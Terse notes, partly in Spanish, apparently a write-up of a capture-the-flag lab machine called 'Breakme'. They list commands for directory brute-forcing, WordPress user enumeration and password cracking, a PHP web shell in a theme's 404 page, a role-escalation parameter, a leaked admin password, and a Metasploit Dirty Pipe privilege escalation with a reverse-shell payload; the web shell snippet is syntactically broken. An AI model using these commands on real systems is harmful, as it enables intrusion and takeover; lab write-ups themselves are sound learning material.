---
title: "Breakme"
description: "Write-up Breakme , MED MACHINE"
pubDate: "Jul 15 2022"
heroImage: "/image.jpg"
---

10.10.124.81

 feroxbuster -u 'http://breakme.thm' -w /usr/share/wordlists/dirb/big.txt
wpscan --url http:/10.10.199.6/wordpress --enumerate u

admin 
bob

wpscan --url http://breakme.thm/wordpress/ -U admin,bob -P /usr/share/wordlists/rockyou.txt

if(isset($_GET['cmd]))
{
system)($_GET['cmd]);
}


en burpsuite se edita el nombre y se pone
&wpda_role[]=administrator

admin 
1Dy95jL1bg02sErwwfW#NeCd

http://breakme.thm/wordpress/wp-content/themes/twentytwentyone/404.php

cat /etc/passwd | grep 'sh$'

john:x:1002:1002:john
youcef:x:1000:1000:youcef
root:x:0:0:root:/root:/bin/bash

ps -aux | grep john (proscesos de jhon corriendo)

msfconle 
use exploit/multi/script/web_delivery

set session 1

use post/multi/recon/local_exploit_suggester

use exploit/linux/local/cve_2022_0847_dirtypipe
set SESSION 1
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 10.6.15.252
set LPORT 4445
run

search -f user*.txt

